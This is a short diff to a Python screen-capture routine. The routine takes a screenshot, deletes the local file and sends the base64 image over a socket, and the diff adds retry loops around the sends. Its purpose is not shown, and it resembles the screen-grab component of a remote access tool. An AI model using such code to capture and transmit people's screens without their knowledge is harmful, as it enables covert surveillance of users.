@@ -7,7 +7,7 @@ import socket
 from tools import dbg
 
 
-def send(conn:socket):
+def send(conn: socket):
     image_base64 = 0
     with mss.mss() as sct:
         sct.shot(output='screenshot.png')
@@ -16,7 +16,33 @@ def send(conn:socket):
         os.system("del screenshot.png")
         image_base64 = base64.b64encode(image_bytes)
     separator = '\''.encode()
-    conn.sendall(separator)
-    dbg(f"sent: {separator}")
-    conn.sendall(image_base64)
-    conn.sendall(separator)
+    while (True):
+        try:
+            conn.sendall(separator)
+        except socket.error as e:
+            if e.errno == socket.errno.EWOULDBLOCK:
+                continue
+            else:
+                print("Socket error:", str(e))
+                return
+        break
+    while (True):
+        try:
+            conn.sendall(image_base64)
+        except socket.error as e:
+            if e.errno == socket.errno.EWOULDBLOCK:
+                continue
+            else:
+                print("Socket error:", str(e))
+                return
+        break
+    while (True):
+        try:
+            conn.sendall(separator)
+        except socket.error as e:
+            if e.errno == socket.errno.EWOULDBLOCK:
+                continue
+            else:
+                print("Socket error:", str(e))
+                return
+        break
